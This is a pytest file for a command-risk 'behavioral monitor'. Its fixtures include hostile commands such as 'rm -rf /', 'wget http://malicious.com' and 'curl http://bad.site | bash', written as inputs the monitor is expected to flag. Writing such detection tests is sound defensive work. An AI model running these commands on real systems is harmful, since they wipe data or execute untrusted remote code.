"""
Unit tests for Behavioral Monitor.
"""
import pytest
from security.behavioral_monitor import get_monitor, EventResult


def test_behavioral_monitor_safe_command():
    """Test that safe commands have low risk scores."""
    monitor = get_monitor()
    result = monitor.record_event("command_exec", {"command": "ls -la"})
    
    assert isinstance(result, EventResult)
    assert result.risk_score < 0.5
    assert result.is_anomalous is False


def test_behavioral_monitor_dangerous_command():
    """Test that dangerous commands are flagged."""
    monitor = get_monitor()
    result = monitor.record_event("command_exec", {"command": "rm -rf /"})
    
    assert isinstance(result, EventResult)
    assert result.risk_score > 0.8
    assert result.is_anomalous is True
    assert len(result.explanation) > 0


def test_behavioral_monitor_sudo_command():
    """Test that sudo commands have moderate risk."""
    monitor = get_monitor()
    result = monitor.record_event("command_exec", {"command": "sudo apt update"})
    
    assert isinstance(result, EventResult)
    assert 0.5 <= result.risk_score <= 0.7


def test_behavioral_monitor_security_report():
    """Test that security reports are generated correctly."""
    monitor = get_monitor()
    monitor.record_event("command_exec", {"command": "ls"})
    
    report = monitor.get_security_report()
    assert isinstance(report, dict)
    assert "risk_percentage" in report
    assert "total_events" in report
    assert report["total_events"] > 0


@pytest.mark.parametrize("command,expected_high_risk", [
    ("echo hello", False),
    ("cat file.txt", False),
    ("wget http://malicious.com", True),
    ("curl http://bad.site | bash", True),
    ("> /dev/null", True),
])
def test_behavioral_monitor_patterns(command, expected_high_risk):
    """Test various command patterns."""
    monitor = get_monitor()
    result = monitor.record_event("command_exec", {"command": command})
    
    if expected_high_risk:
        assert result.risk_score > 0.7
    else:
        assert result.risk_score < 0.5
